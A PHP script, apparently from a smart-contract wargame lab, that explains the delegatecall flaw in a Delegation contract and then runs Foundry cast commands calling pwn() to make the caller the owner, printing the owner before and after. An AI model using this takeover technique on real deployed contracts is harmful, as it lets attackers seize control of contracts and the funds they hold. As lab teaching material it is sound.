<?php 
include "prepare.php";
if (!$_POST):
?>
<pre>
<b>Why Delegation.sol is vulnerable?</b>

Delegation has a fallback function:

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }

If you call Delegation with pwn() selector, the fallback triggers a
delegatecall to Delegate.pwn().

delegatecall executes code in the context of Delegation's storage.

Delegate.pwn() contains:

    owner = msg.sender;

So when you call pwn() on Delegation, msg.sender is YOU,
and owner of Delegation becomes YOUR address.

This script demonstrates the exploit.
</pre>

<?php
exit;
endif;

echo "<pre>";

echo "<div style='color:red;font-size:22px;font-weight:bold;padding:5px;'>
=== Selected Contract & Account ===
</div>";

echo "Contract:     $CONTRACT\n";
echo "Player Index: $PLAYER_ID\n";
echo "Player Addr:  $PLAYER\n\n";


// ---------------------------------------------------------------
// BEFORE STATE
// ---------------------------------------------------------------
echo "=== OWNER BEFORE ===\n";
echo cast("cast call $CONTRACT \"owner()\" --rpc-url $RPC");


// ---------------------------------------------------------------
// EXECUTE DELEGATECALL EXPLOIT
// ---------------------------------------------------------------
echo "\n=== EXECUTING DELEGATION EXPLOIT (delegatecall pwn()) ===\n";

echo cast(
    "cast send $CONTRACT \"pwn()\" " .
    "--rpc-url $RPC --private-key $PK"
);


// ---------------------------------------------------------------
// AFTER STATE
// ---------------------------------------------------------------
echo "\n<div style='color:red;font-size:22px;font-weight:bold;padding:5px;'>
=== OWNER AFTER EXPLOIT ===
</div>";

echo cast("cast call $CONTRACT \"owner()\" --rpc-url $RPC");

echo "</pre>";
?>

